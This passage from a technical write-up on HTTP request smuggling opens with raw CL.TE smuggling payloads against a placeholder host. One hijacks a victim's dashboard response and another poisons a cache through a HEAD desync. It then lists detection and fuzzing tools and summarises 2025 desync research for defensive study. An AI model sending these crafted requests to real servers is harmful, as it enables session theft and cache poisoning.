Host: vulnerable.com\r\n
Content-Length: 67\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /private/dashboard HTTP/1.1\r\n
Host: vulnerable.com\r\n
X-Ignore: x
```

**Sequence**:
1. Attacker sends the above (CL.TE smuggle).
2. `GET /private/dashboard` is queued as the next request on the same connection.
3. Victim's request arrives on the same connection → Back-End pairs victim's request with attacker's response queue slot.
4. Attacker receives the response to `/private/dashboard` (intended for the victim).

### Composite: CL.TE + HEAD → Cache Poisoning

Use HEAD method to inject a Content-Length header into the response, causing response body desync.

```
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 55\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
HEAD /large-page HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- `HEAD /large-page` returns headers including `Content-Length: 54321` but no body.
- The **next** response on the connection has its first 54,321 bytes consumed as the "body" of the HEAD response.
- This desynchronizes the entire response queue → cache stores the wrong response for the wrong URL.

---



\## Detection Tools



| Tool | Target | Core Technique |

|---|---|---|

| \*\*HTTP Request Smuggler v3.0\*\* (Burp extension) | Server-side + H2 + CSD + 0.CL | Primitive-level parser discrepancy detection; bypasses fingerprint-based defenses |

| \*\*HTTP Garden\*\* (open source) | Origin server parsers | Coverage-guided differential fuzzing with REPL; mutates all request stream components |

| \*\*Gudifu\*\* | Proxies | Graybox differential fuzzing across full HTTP request space |

| \*\*WAFFLED\*\* (open source) | WAF ↔ framework | Grammar-based fuzzing per Content-Type (JSON, multipart, XML) |

| \*\*smuggler.py\*\* | Server-side HRS | CL.TE, TE.CL, TE.TE + mutation mode |

| \*\*smugchunks\*\* (open source) | Chunk extension HRS | Automated TERM.EXT, EXT.TERM, TERM.SPILL, SPILL.TERM detection |

| \*\*h2cSmuggler\*\* | H2C tunneling | Clear-text HTTP/2 upgrade automation |

| \*\*Turbo Intruder\*\* (Burp extension) | Timing / race-based | Pause-based desync, 0.CL exploit scripts, race conditions |

| \*\*HTTP-Normalizer\*\* (defensive) | Inbound request normalization | Enforces RFC-strict compliance; blocks non-conforming requests |

| \*\*HTTP Desync Guardian\*\* (AWS, defensive) | Inbound request classification | Risk-grades requests and blocks suspicious patterns |



---



\## Summary: Core Principles



All HTTP mutations ultimately stem from \*\*one fact\*\*: HTTP/1.1 is text-based, offers multiple methods for specifying message boundaries, and thousands of independent implementations interpret the specification with varying degrees of leniency. HTTP/2 downgrading adds a fourth length interpretation method, and per-framework Content-Type/body parsers create a fifth mismatch axis.



Three developments defined 2025. First, \*\*chunk extensions emerged as an independent attack surface\*\*. A feature "nobody uses" enables TERM.EXT / EXT.TERM / SPILL mutations that achieve smuggling without any CL-vs-TE confusion (CVE-2025-55315, CVSS 9.9). Second, \*\*the attack surface expanded into the TLS layer\*\*. The Opossum Attack exploits a protocol design weakness — the coexistence of implicit and opportunistic TLS — to achieve permanent desync without any implementation bug. Third, \*\*desync began to be repurposed as attack infrastructure\*\*: CL.0 global cache poisoning weaponized the Location header of 3xx redirects as a covert C2 side channel.



Six years of individual patches and regex-based defenses block only \*\*known mutation fingerprints\*\* without resolving the fundamental parser divergence. Structural solutions require three concurrent efforts: upstream HTTP/2 adoption (eliminating framing mismatch), opportunistic TLS deprecation (eliminating TLS-layer desync), and RFC-strict normalization proxies (eliminating structure and body mismatch). From a detection perspective, the necessary shift is from exploit-pattern matching to identifying \*\*parser-primitive-level discrepancies themselves\*\*.



---



\*This document was created for defensive security research and vulnerability understanding purposes.\*

